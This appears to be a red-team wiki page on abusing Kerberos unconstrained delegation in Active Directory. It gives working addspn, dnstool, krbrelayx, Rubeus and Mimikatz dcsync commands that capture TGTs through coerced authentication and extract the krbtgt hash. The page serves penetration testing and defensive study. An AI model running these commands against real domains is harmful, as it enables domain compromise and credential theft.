# (KUD) Unconstrained

## Theory

If an account (user or computer), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it (or [force it](../../mitm-and-coerced-authentications/)) using Kerberos. The attacker service will receive an ST (service ticket) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user. Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.

{% hint style="info" %}
Unconstrained delegation abuses are usually combined with an [MS-RPRN abuse (printerbug)](../../mitm-and-coerced-authentications/ms-rprn.md), [MS-EFSR abuse (petitpotam)](../../mitm-and-coerced-authentications/ms-efsr.md), [MS-FSRVP abuse (shadowcoerce)](../../mitm-and-coerced-authentications/ms-fsrvp.md), r [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to gain domain admin privileges.

## Practice

{% tabs %}
{% tab title="From the attacker machine (UNIX-like)" %}
In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs (i.e. of the compromised account) and add a DNS entry for that name.

This allows targets (e.g. Domain Controllers or Exchange servers) to authenticate back to the attacker machine.

All of this can be done from UNIX-like systems with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python).

{% hint style="info" %}
When attacking accounts able to delegate without constraints, there are two major scenarios

* **the account is a computer**: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. Since ticket received by krbrelayx will be encrypted with AES256 (by default), attackers will need to either supply the right AES256 key for the unconstrained delegations account (`--aesKey` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments).
* **the account is a user**: users can't edit their own SPNs like computers do. Attackers need to control an [account operator](../../domain-settings/builtin-groups.md) (or any other user that has the needed privileges) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash (`-hashes` argument) or the salt and password (`--krbsalt` and `--krbpass` arguments)
{% endhint %}

{% hint style="success" %}
By default, the salt is always

* **For users**: uppercase FQDN + case sensitive username = `DOMAIN.LOCALuser`
* **For computers**: uppercase FQDN + `host` + lowercase FQDN hostname without the trailing `$` = `DOMAIN.LOCALhostcomputer.domain.local`
{% endhint %}

```bash
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# 3. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'

# 4. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
```

{% hint style="warning" %}
In case, for some reason, attacking a Domain Controller doesn't work (i.e. error saying`Ciphertext integrity failed.`) try to attack others (if you're certain the credentials you supplied were correct). Some replication and propagation issues could get in the way.
{% endhint %}

Once the krbrelayx listener is ready, an [authentication coercion attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange), [PetitPotam](../../mitm-and-coerced-authentications/ms-efsr.md)) can be operated. The listener will then receive a Kerberos authentication, hence a ST, containing a TGT.

The TGT will then be usable with [Pass the Ticket](../ptt.md) (to act as the victim) or with [S4U2self abuse](s4u2self-abuse.md) (to obtain local admin privileges over the victim).
{% endtab %}

{% tab title="From the compromised computer (Windows)" %}
Once the KUD capable host is compromised, [Rubeus](https://github.com/GhostPack/Rubeus) can be used (on the compromised host) as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains.

```bash
Rubeus.exe monitor /interval:5
```

Once the monitor is ready, a [forced authentication attack](../../mitm-and-coerced-authentications/) (e.g. [PrinterBug](../../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)) can be operated. Rubeus will then receive an authentication (hence a Service Ticket, containing a TGT). The TGT can be used to request a Service Ticket for another service.

```bash
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
```

Alternatively, the TGT can be used with [S4U2self abuse](s4u2self-abuse.md) in order to gain local admin privileges over the TGT's owner.

Once the TGT is injected, it can natively be





&#x20;used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash.

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```
